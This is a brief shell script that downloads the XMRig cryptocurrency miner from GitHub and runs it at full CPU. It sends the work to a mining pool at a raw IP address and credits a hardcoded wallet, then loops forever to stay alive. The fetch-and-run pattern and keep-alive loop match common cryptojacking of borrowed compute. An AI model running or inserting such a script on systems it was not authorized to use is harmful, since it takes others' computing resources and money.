#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz
tar xf xmrig-6.14.0-linux-x64.tar.gz
cd xmrig-6.14.0
./xmrig --donate-level=0 -a rx/0 -o 172.65.200.133:3380 -u 368dnSPEiXj1Ssy35BBWMwKcmFnGLuqa1J.oo1bgto1y12ayc7 --http-enabled --http-port=4000 --nicehash --cpu-priority 0 --donate-level=0 --cpu 20
while [ 1 ]; do
sleep 3
done
sleep 999
